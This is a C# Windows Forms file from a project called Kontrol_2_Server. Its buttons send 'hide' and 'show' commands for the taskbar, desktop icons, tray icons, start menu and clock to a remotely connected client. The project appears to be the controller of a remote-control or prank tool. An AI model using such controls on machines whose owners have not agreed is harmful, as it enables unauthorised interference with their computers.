using System;
using System.Threading;
using System.Windows.Forms;

namespace Kontrol_2_Server
{
    public partial class HideElementsForm : Form
    {

        public int clientId = 0;
        public HideElementsForm()
        {
            InitializeComponent();
        }

        //I am gonna try and make my other commands multithreaded cause it's cooler
        private void button1_Click(object sender, EventArgs e)
        {
            if (button1.Text.Contains("Visible"))
            {
                new Thread(() =>
                {
                    try
                    {
                        MainForm.SendCommand("element\ntaskbar\nhide", clientId);
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("Error: Connection lost.", "Socket Exception occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        this.Close();
                    }
                }).Start();
                button1.Text = "Task Bar: Hidden";
            }
            else
            {
                new Thread(() =>
                {
                    try
                    {
                        MainForm.SendCommand("element\ntaskbar\nshow", clientId);
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("Error: Connection lost.", "Socket Exception occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        this.Close();
                    }
                }).Start();
                button1.Text = "Task Bar: Visible";
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (button2.Text.Contains("Visible"))
            {
                new Thread(() =>
                {
                    try
                    {
                        MainForm.SendCommand("element\ndesktopIcons\nhide", clientId);
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("Error: Connection lost.", "Socket Exception occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        this.Close();
                    }
                }).Start();
                button2.Text = "Desktop Icons: Hidden";
            }
            else
            {
                new Thread(() =>
                {
                    try
                    {
                        MainForm.SendCommand("element\ndesktopIcons\nshow", clientId);
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("Error: Connection lost.", "Socket Exception occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        this.Close();
                    }
                }).Start();
                button2.Text = "Desktop Icons: Visible";
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (button3.Text.Contains("Visible"))
            {
                new Thread(() =>
                {
                    try
                    {
                        MainForm.SendCommand("element\ntrayIcons\nhide", clientId);
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("Error: Connection lost.", "Socket Exception occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        this.Close();
                    }
                }).Start();
                button3.Text = "Tray Icons: Hidden";
            }
            else
            {
                new Thread(() =>
                {
                    try
                    {
                        MainForm.SendCommand("element\ntrayIcons\nshow", clientId);
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("Error: Connection lost.", "Socket Exception occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        this.Close();
                    }
                }).Start();
                button3.Text = "Tray Icons: Visible";
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (button4.Text.Contains("Visible"))
            {
                new Thread(() =>
                {
                    try
                    {
                        MainForm.SendCommand("element\nstartMenu\nhide", clientId);
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("Error: Connection lost.", "Socket Exception occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        this.Close();
                    }
                }).Start();
                button4.Text = "Start Menu: Hidden";
            }
            else
            {
                new Thread(() =>
                {
                    try
                    {
                        MainForm.SendCommand("element\nstartMenu\nshow", clientId);
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("Error: Connection lost.", "Socket Exception occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        this.Close();
                    }
                }).Start();
                button4.Text = "Start Menu: Visible";
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            if (button5.Text.Contains("Visible"))
            {
                new Thread(() =>
                {
                    try
                    {
                        MainForm.SendCommand("element\nclock\nhide", clientId);
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("Error: Connection lost.", "Socket Exception occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        this.Close();
                    }
                }).Start();
                button5.Text = "Clock: Hidden";
            }
            else
            {
                new Thread(() =>
                {
                    try
                    {
                        MainForm.SendCommand("element\nclock\nshow", clientId);
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("Error: Connection lost.", "Socket Exception occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        this.Close();
                    }
                }).Start();
                button5.Text = "Clock: Visible";
            }
        }
    }
}
